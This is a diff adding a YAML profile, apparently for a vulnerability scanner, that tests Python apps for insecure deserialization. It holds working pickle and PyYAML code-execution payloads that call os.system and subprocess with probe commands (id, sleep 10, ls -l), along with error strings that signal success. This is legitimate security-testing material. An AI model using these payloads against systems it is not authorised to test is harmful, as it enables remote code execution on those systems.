@@ -1,0 +1,28 @@
+# Insecure Deserialization Attack Profile for Python
+name: "Python Deserialization"
+category: "deserialization"
+severity: "critical"
+description: "Tests for insecure deserialization vulnerabilities in Python via pickle and PyYAML unsafe loading"
+supported_languages:
+  - "python"
+target_fields:
+  - "serialized"
+  - "pickle"
+  - "yaml"
+  - "python_pickle"
+  - "yaml_payload"
+success_indicators:
+  - "pickle.UnpicklingError"
+  - "yaml.constructor.ConstructorError"
+  - "could not find mark"
+  - "AttributeError:"
+  - "NameError:"
+  - "ModuleNotFoundError:"
+payloads:
+  # Pickle
+  - "cos\nsystem\n(S'id'\ntR."
+  - "cos\nsystem\n(S'sleep 10'\ntR."
+  - "gANjcG9zaXgKc3lzdGVtCnEAWAIAAABpZHEBhXECUnEDLg=="
+  # PyYAML Unsafe Load
+  - "!!python/object/apply:os.system ['id']"
+  - "!!python/object/apply:subprocess.check_output [['ls', '-l']]"
